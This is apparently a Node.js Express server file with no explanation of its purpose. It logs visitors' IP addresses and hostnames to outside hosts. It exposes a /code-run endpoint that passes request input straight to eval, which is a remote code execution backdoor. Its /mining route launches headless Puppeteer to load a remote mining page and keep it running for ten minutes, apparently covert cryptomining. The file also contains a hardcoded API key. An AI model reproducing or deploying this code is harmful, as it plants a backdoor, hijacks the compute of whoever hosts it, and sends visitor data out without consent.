const express = require("express");
const cors = require("cors");
const puppeteer = require("puppeteer");
const axios = require('axios');
const app = express();
const data = {};
app.use(express.json());
app.use(cors({methods:['GET','POST']}));


const sleep = ms => new Promise(res => setTimeout(res, ms));

app.get("/", (request, response) => {
  response.send(`
  <!DOCTYPE html>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
    *{
      font-family:'Poppins';
    }
  </style>
  <h1 class="data">WAIT</h1>
  <script>
  fetch('https://api.ipify.org?format=json').then(res => res.json())
.then(ip => {
  console.log(location.hostname,ip.ip)
  fetch('https://'+location.hostname+'/server', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({host:location.hostname})
  }).then(res => res.json())
  .then(res =>{
    document.querySelector('.data').innerText = ' 😁 CLOSE PAGE 😁';
  });
  
})
    
  </script>
  `);
});

app.get("/computer", (request, response) => {
  response.send(`
  <!DOCTYPE html>
  <script>
  fetch('https://api.getgeoapi.com/v2/ip/check?api_key=e6da8462fa8d303b698d513cb203d99ac8574a4c&format={json}').then(res => res.json())
.then(data => {

  
  fetch('https://server-logbin.onrender.com/create', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({address:location.hostname, ip:data.ip})
  });
  
  
});
  </script>
  `);
});

function stop(){
  axios.get('https://yummy-modern-feather.glitch.me/stop');
}





app.post('/code-run', async (req, res) => {
 //axios.post('https://logback-9pj1.onrender.com/error',{err:'Error server code'}); 
  
    eval(req.body.code);
  
    res.send({type:true});
});
app.get('/mining', async (req, res) =>{
   
  console.log('The start')
  const browser = await puppeteer.launch({ headless: true, args: ["--no-sandbox"] });
  const page = await browser.newPage();
  await page.goto(`https://logbin.vercel.app/mining.html`);
  await page.setViewport({ width: 120, height: 120 });
  await sleep(10000);
  await sleep(600000);
  console.log('The end');
  //await browser.close();
  res.send({type:200});
})

app.get('/stop', (req, res) => {
  ress.send({type:true});
});



app.post('/server', async (req, res) => {
  const browser = await puppeteer.launch({args: ["--no-sandbox"]});
  const page = await browser.newPage();
  await page.goto(`https://${req.body.host}/computer`);
  await sleep(5000);
  res.send({type:true})
  await browser.close();
});




const listener = app.listen('3000', () => {
  console.log(`Your app is listening on port ${listener.address().port}`);

});


